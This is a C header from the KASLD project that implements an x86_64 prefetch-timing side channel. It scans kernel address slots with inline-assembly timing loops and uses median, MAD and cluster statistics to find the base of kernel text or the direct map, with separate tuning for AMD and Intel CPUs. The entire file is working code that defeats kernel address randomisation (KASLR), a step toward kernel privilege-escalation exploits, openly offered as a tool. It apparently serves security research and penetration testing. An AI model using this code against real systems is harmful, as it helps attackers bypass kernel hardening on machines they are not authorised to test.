// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Prefetch timing-scan + mapped-region left-edge detection.
//
// Builds on the prefetch timing primitive in sidechannel.h to scan a window of
// KASLR-aligned slots and locate the LEFT EDGE of a contiguous mapped kernel
// region — the region base. Shared by the components that scan different
// windows for different region bases (kernel text, the direct map): the window
// base, step, slot count and iteration budget are all parameters, so the same
// collect + edge-detection logic serves any region.
//
// The base is the LEFT EDGE of the mapped run, not the extremum within it: the
// base slot carries a weaker signal than the hot body of the region, so keying
// off the extremum (or a body-tuned threshold) reports the base one slot high.
// Edge detection walks to the unmapped->mapped transition instead.
// ---
// <bcoles@gmail.com>

#ifndef KASLD_PREFETCH_SCAN_H
#define KASLD_PREFETCH_SCAN_H

#if !defined(__x86_64__) && !defined(__amd64__)
#error "prefetch_scan.h: x86_64 only"
#endif

#include "cpu.h"
#include "sidechannel.h"

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define PREFETCH_SCAN_WARMUP 3

// ---------------------------------------------------------------------------
// Collect per-slot prefetch timings for `n` slots [base, base + n*step), into
// times[0..n) (caller-allocated). The reducer depends on the CPU:
//   - AMD: mapped pages produce HIGHER latency; per-slot SUM across iterations
//     preserves the slow-vs-fast proportion even when the per-sample signal is
//     smaller than one (coarse) rdtscp quantum.
//   - Intel / unknown: mapped pages resolve FASTER (TLB hit); per-slot MIN
//     across iterations is the least-noised sample.
// No syscall between probes: this measures page-table-walk latency, which is
// static, so a syscall would only add noise.
// ---------------------------------------------------------------------------
__attribute__((unused)) static void
prefetch_scan_collect(uint64_t *times, size_t n, uint64_t base, uint64_t step,
                      int vendor, int iterations) {
  size_t idx;
  int i;

  if (vendor == CPU_VENDOR_AMD) {
    for (idx = 0; idx < n; idx++)
      times[idx] = 0;
    for (i = 0; i < PREFETCH_SCAN_WARMUP; i++)
      for (idx = 0; idx < n; idx++)
        time_prefetch(base + idx * step);
    for (i = 0; i < iterations; i++)
      for (idx = 0; idx < n; idx++)
        times[idx] += time_prefetch(base + idx * step);
  } else {
    for (idx = 0; idx < n; idx++)
      times[idx] = ~(uint64_t)0;
    for (i = 0; i < PREFETCH_SCAN_WARMUP + iterations; i++)
      for (idx = 0; idx < n; idx++) {
        uint64_t t = time_prefetch(base + idx * step);
        if (i >= PREFETCH_SCAN_WARMUP && t < times[idx])
          times[idx] = t;
      }
  }
}

// Batch size for the batched AMD collector: prefetches issued per timer
// bracket. Larger amortizes the rdtscp overhead further and widens the
// mapped/unmapped separation, at proportional cost. Overridable for tuning.
#ifndef PREFETCH_SCAN_BATCH
#define PREFETCH_SCAN_BATCH 2000
#endif

// Timing primitive for the batched collector: issue `batch` back-to-back
// prefetch pairs to a single address inside one rdtscp bracket. With one timer
// pair amortized over the whole batch, the measured span is dominated by
// batch * per-access page-walk latency rather than by rdtscp overhead. On AMD
// without KPTI this exposes a mapped/unmapped differential that a single timed
// prefetch leaves buried in the rdtscp quantum: a mapped address (full nested
// page-table walk) reads many-fold above the unmapped baseline where the walk
// short-circuits. `batch` must be >= 1 (it is decremented to zero as the loop
// counter).
__attribute__((unused)) static uint64_t
prefetch_scan_time_batch(uint64_t addr, unsigned long batch) {
  uint64_t t0_lo, t0_hi, t1_lo, t1_hi;

  __asm__ volatile(".intel_syntax noprefix;"
                   "mfence;"
                   "rdtscp;"
                   "mov %0, rax;"
                   "mov %1, rdx;"
                   "lfence;"
                   "2:;"
                   "prefetchnta qword ptr [%5];"
                   "prefetcht2 qword ptr [%5];"
                   "dec %4;"
                   "jnz 2b;"
                   "lfence;"
                   "rdtscp;"
                   "mov %2, rax;"
                   "mov %3, rdx;"
                   "mfence;"
                   ".att_syntax;"
                   : "=&r"(t0_lo), "=&r"(t0_hi), "=&r"(t1_lo), "=&r"(t1_hi),
                     "+r"(batch)
                   : "r"(addr)
                   : "rax", "rcx", "rdx", "cc", "memory");

  uint64_t t0 = (t0_hi << 32) | t0_lo;
  uint64_t t1 = (t1_hi << 32) | t1_lo;
  return t1 - t0;
}

// ---------------------------------------------------------------------------
// Batched AMD collector: for each slot, time PREFETCH_SCAN_BATCH back-to-back
// prefetches under one rdtscp bracket and keep the MIN across `iterations`
// trials. Amortizing the timer over the whole batch exposes the per-access
// page-walk latency directly, so a mapped slot (full nested walk) stands
// many-fold above the unmapped baseline where the walk short-circuits — a
// differential that the single-timed-prefetch sum can leave buried in rdtscp
// quantization on some AMD parts (notably virtualized hosts). MIN across trials
// removes upward scheduler noise; the mapped floor stays high because every
// prefetch in the batch re-walks. Produces the same mapped=HIGHER orientation
// and times[] layout as prefetch_scan_collect's AMD branch, so
// prefetch_scan_find_edge_batched consumes it.
//
// Each slot's trials run consecutively (slot-major), so its MIN is taken over a
// short contiguous window and reliably captures one clean trial even when a
// co-scheduled tenant steals cycles for part of the scan. Sampling one slot per
// sweep instead would spread a slot's trials across the whole scan, letting a
// periodic external stall inflate the same slots every sweep into a false
// cluster.
// ---------------------------------------------------------------------------
__attribute__((unused)) static void
prefetch_scan_collect_batched(uint64_t *times, size_t n, uint64_t base,
                              uint64_t step, int iterations) {
  size_t idx;
  int i;

  for (idx = 0; idx < n; idx++) {
    uint64_t addr = base + idx * step;
    uint64_t best = ~(uint64_t)0;
    for (i = 0; i < PREFETCH_SCAN_WARMUP; i++)
      (void)prefetch_scan_time_batch(addr, PREFETCH_SCAN_BATCH);
    for (i = 0; i < iterations; i++) {
      uint64_t t = prefetch_scan_time_batch(addr, PREFETCH_SCAN_BATCH);
      if (t < best)
        best = t;
    }
    times[idx] = best;
  }
}

// ---------------------------------------------------------------------------
// Dump per-slot timings to stderr (verbose diagnostics).
// ---------------------------------------------------------------------------
__attribute__((unused)) static void prefetch_scan_dump(const uint64_t *times,
                                                       size_t n, uint64_t base,
                                                       uint64_t step,
                                                       const char *stat) {
  size_t idx;
  fprintf(stderr, "# slot addr %s\n", stat);
  for (idx = 0; idx < n; idx++)
    fprintf(stderr, "%3zu 0x%lx %lu\n", idx, (unsigned long)(base + idx * step),
            (unsigned long)times[idx]);
}

static int prefetch_scan_cmp_u64(const void *a, const void *b) {
  uint64_t va = *(const uint64_t *)a;
  uint64_t vb = *(const uint64_t *)b;
  return (va > vb) - (va < vb);
}

// ---------------------------------------------------------------------------
// Median absolute deviation of times[0..n) about `center`: the robust spread
// of the unmapped baseline. Robust to <50% outliers, so the mapped plateau and
// isolated timing spikes do not inflate it. Returns 0 on allocation failure
// (callers floor it).
// ---------------------------------------------------------------------------
static uint64_t prefetch_scan_mad(const uint64_t *times, size_t n,
                                  uint64_t center) {
  uint64_t *dev = (uint64_t *)malloc(n * sizeof(uint64_t));
  if (!dev)
    return 0;
  size_t i;
  for (i = 0; i < n; i++)
    dev[i] = times[i] > center ? times[i] - center : center - times[i];
  qsort(dev, n, sizeof(uint64_t), prefetch_scan_cmp_u64);
  uint64_t mad = dev[n / 2];
  free(dev);
  return mad;
}

// ---------------------------------------------------------------------------
// AMD cluster search: leftmost slot above `threshold` with >= confirm_k of the
// next confirm_m slots also above it (rejects isolated outliers and short
// boundary artifacts), then walk that cluster's left edge out to the looser
// `edge_bound` (recovers a base slot weaker than the region body). Returns the
// left-edge slot index, or -1 if no confirmed cluster.
// ---------------------------------------------------------------------------
static long prefetch_scan_amd_cluster(const uint64_t *times, size_t n,
                                      uint64_t threshold, uint64_t edge_bound,
                                      int confirm_k, int confirm_m) {
  size_t idx;
  for (idx = 0; confirm_m > 0 && idx + (size_t)confirm_m <= n; idx++) {
    if (times[idx] <= threshold)
      continue;
    int count = 0, j;
    for (j = 0; j < confirm_m; j++)
      if (times[idx + j] > threshold)
        count++;
    if (count >= confirm_k) {
      while (idx > 0 && times[idx - 1] > edge_bound)
        idx--;
      return (long)idx;
    }
  }
  return -1;
}

// Minimum plateau width (in slots) the low-amplitude AMD fallback requires
// before it will accept a mapped run as kernel text. It must clear the
// page-table boundary bands (~7 slots) with margin: those sit ABOVE the
// fallback's threshold (they are taller than a low-amplitude kernel plateau),
// so width is the only feature that separates them from the kernel image.
// Widening it rejects leaner kernel images as ambiguous; narrowing it toward
// the boundary-band width raises the false-positive risk.
#ifndef PREFETCH_MIN_PLATEAU_SLOTS
#define PREFETCH_MIN_PLATEAU_SLOTS 12
#endif

// ---------------------------------------------------------------------------
// Index of the mapped region's LEFT EDGE (base slot) in times[0..n), or -1 if
// no mapped region is found. The median of the slots is the unmapped baseline
// (most slots are unmapped).
//
// AMD (sums, mapped reads HIGHER) runs two tiers:
//   Tier 1 (high amplitude): the leftmost slot above a strict 1.5x-median
//   threshold with >= confirm_k of the next confirm_m slots also above it — the
//   confirmation window rejects isolated scheduler outliers and page-table
//   boundary artifacts — then walk that cluster's left edge out to a looser
//   1.25x-median bound (the strict threshold is body-tuned and can drop the
//   weaker base slot; unmapped slots sit at ~1.0x and never cross 1.25x, so the
//   walk recovers the base and never lands below it).
//
//   Tier 2 (low amplitude, only when tier 1 finds nothing): some CPUs — notably
//   virtualized AMD guests — produce a mapped/unmapped differential far below
//   1.5x (a few percent) yet spatially coherent across the whole kernel image.
//   The threshold there is scaled to the baseline dispersion (median + K*MAD),
//   not a fixed multiple, so a low-amplitude plateau still clears it. Because
//   the page-table boundary bands are TALLER than such a plateau, amplitude
//   cannot separate them; the fallback requires the confirmed run to be at
//   least PREFETCH_MIN_PLATEAU_SLOTS wide (the boundary bands are only a few
//   slots), and reports nothing for a kernel image narrower than that.
//   Returns -1 if neither tier confirms a cluster.
//
// Intel / unknown (mins, mapped reads FASTER): the global minimum is a seed
// guaranteed to lie inside the mapped region (min-over-iterations removes
// upward noise, so no unmapped slot reads faster than a mapped one); walk LEFT
// from it to the unmapped->mapped transition, halting at the midpoint between
// the baseline and the fastest slot. Size-agnostic; confirm_* are unused here.
// ---------------------------------------------------------------------------
__attribute__((unused)) static long
prefetch_scan_find_edge(const uint64_t *times, size_t n, int vendor,
                        int confirm_k, int confirm_m) {
  if (n == 0)
    return -1;

  uint64_t *sorted = (uint64_t *)malloc(n * sizeof(uint64_t));
  if (!sorted)
    return -1;
  memcpy(sorted, times, n * sizeof(uint64_t));
  qsort(sorted, n, sizeof(uint64_t), prefetch_scan_cmp_u64);
  uint64_t median = sorted[n / 2];
  free(sorted);

  if (vendor == CPU_VENDOR_AMD) {
    /* Tier 1: strict high-amplitude cluster. */
    long edge =
        prefetch_scan_amd_cluster(times, n, median + median / 2,
                                  median + median / 4, confirm_k, confirm_m);
    if (edge >= 0)
      return edge;

    /* Tier 2: low-amplitude wide-plateau fallback. Threshold scales to the
     * baseline dispersion; a MAD floor guards against coarse rdtscp
     * quantization collapsing MAD to ~0. The confirmation window is the full
     * minimum plateau width, requiring ~3/4 of it above threshold so a few
     * baseline dips or steal-event spikes inside the plateau are tolerated
     * while the narrow boundary bands cannot qualify. */
    uint64_t mad = prefetch_scan_mad(times, n, median);
    uint64_t mad_floor = median >> 8;
    if (mad < mad_floor)
      mad = mad_floor;
    uint64_t threshold = median + 4 * mad;
    uint64_t edge_bound = median + 2 * mad;
    int wide_m = PREFETCH_MIN_PLATEAU_SLOTS;
    int wide_k = (wide_m * 3 + 3) / 4;
    return prefetch_scan_amd_cluster(times, n, threshold, edge_bound, wide_k,
                                     wide_m);
  }

  uint64_t min_time = ~(uint64_t)0;
  size_t seed = 0, idx;
  for (idx = 0; idx < n; idx++)
    if (times[idx] < min_time) {
      min_time = times[idx];
      seed = idx;
    }
  uint64_t edge_bound = median - (median - min_time) / 2;
  while (seed > 0 && times[seed - 1] < edge_bound)
    seed--;
  return (long)seed;
}

// Multiple of the baseline median that a batched-collector slot must clear to
// count as mapped. The batched collector amplifies every mapped slot equally,
// so the plateau stands many-fold above baseline (>10x observed) while even a
// contention-perturbed baseline slot stays well under 2x. A threshold in that
// empty gap rejects the false clusters that the summed collector's 1.5x bound
// admits under load, without approaching the plateau. Overridable for tuning.
#ifndef PREFETCH_BATCH_RATIO
#define PREFETCH_BATCH_RATIO 3
#endif

// ---------------------------------------------------------------------------
// Left-edge (base slot) finder for the BATCHED collector, or -1 if no mapped
// plateau is found. The batched profile is strongly bimodal — unmapped baseline
// vs a mapped plateau many times higher — and, unlike the summed profile, the
// base slot is as strong as the body (batching amplifies every mapped slot
// equally). So there is no weak base slot to walk out to a looser bound: the
// base is simply the leftmost slot of the plateau. Return the leftmost slot
// above PREFETCH_BATCH_RATIO x the median with >= confirm_k of the next
// confirm_m slots also above it (the confirmation window rejects isolated
// spikes and tolerates an unmapped hole inside the image). Nothing is mapped
// below the kernel image base, so the leftmost qualifying slot is the base;
// passing the same value for the cluster helper's threshold and edge bound
// disables its left-walk, which would otherwise step into baseline noise here.
// ---------------------------------------------------------------------------
__attribute__((unused)) static long
prefetch_scan_find_edge_batched(const uint64_t *times, size_t n, int confirm_k,
                                int confirm_m) {
  if (n == 0)
    return -1;

  uint64_t *sorted = (uint64_t *)malloc(n * sizeof(uint64_t));
  if (!sorted)
    return -1;
  memcpy(sorted, times, n * sizeof(uint64_t));
  qsort(sorted, n, sizeof(uint64_t), prefetch_scan_cmp_u64);
  uint64_t median = sorted[n / 2];
  free(sorted);

  uint64_t threshold = median * PREFETCH_BATCH_RATIO;
  return prefetch_scan_amd_cluster(times, n, threshold, threshold, confirm_k,
                                   confirm_m);
}

#endif /* KASLD_PREFETCH_SCAN_H */
